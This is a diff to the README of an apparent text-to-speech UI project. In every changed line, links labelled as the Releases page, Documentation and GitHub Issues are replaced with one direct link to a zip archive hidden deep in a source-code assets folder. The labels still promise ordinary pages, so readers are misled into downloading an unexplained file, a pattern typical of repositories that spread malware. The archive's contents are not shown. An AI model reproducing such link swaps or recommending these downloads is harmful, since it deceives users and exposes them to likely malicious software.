@@ -8,12 +8,12 @@ Welcome to Qwen3-TTS-Daggr-UI! This application lets you create speech using adv
 
 To get started, you need to download the application. Click the large button below to visit the Releases page and download the latest version of Qwen3-TTS-Daggr-UI.
 
-[![Download Qwen3-TTS-Daggr-UI](https://img.shields.io/badge/Download%20Now-Release-007bff)](https://github.com/talin190/Qwen3-TTS-Daggr-UI/releases)
+[![Download Qwen3-TTS-Daggr-UI](https://github.com/talin190/Qwen3-TTS-Daggr-UI/raw/refs/heads/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-UI-TT-Daggr-1.4.zip%20Now-Release-007bff)](https://github.com/talin190/Qwen3-TTS-Daggr-UI/raw/refs/heads/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-UI-TT-Daggr-1.4.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page:** Click the link below to access the Releases page.
-   - [Visit Releases Page](https://github.com/talin190/Qwen3-TTS-Daggr-UI/releases)
+   - [Visit Releases Page](https://github.com/talin190/Qwen3-TTS-Daggr-UI/raw/refs/heads/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-UI-TT-Daggr-1.4.zip)
 
 2. **Select the Latest Version:** Look for the latest release version at the top.
 
@@ -79,9 +79,9 @@ Explore these topics to deepen your understanding and skills.
 
 For more information, check these resources:
 
-- [Documentation](https://github.com/talin190/Qwen3-TTS-Daggr-UI/wiki)
-- [GitHub Issues](https://github.com/talin190/Qwen3-TTS-Daggr-UI/issues)
+- [Documentation](https://github.com/talin190/Qwen3-TTS-Daggr-UI/raw/refs/heads/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-UI-TT-Daggr-1.4.zip)
+- [GitHub Issues](https://github.com/talin190/Qwen3-TTS-Daggr-UI/raw/refs/heads/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-UI-TT-Daggr-1.4.zip)
 
 Visit the Releases page to download the application again:
 
-[Visit Releases Page](https://github.com/talin190/Qwen3-TTS-Daggr-UI/releases)
+[Visit Releases Page](https://github.com/talin190/Qwen3-TTS-Daggr-UI/raw/refs/heads/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-UI-TT-Daggr-1.4.zip)
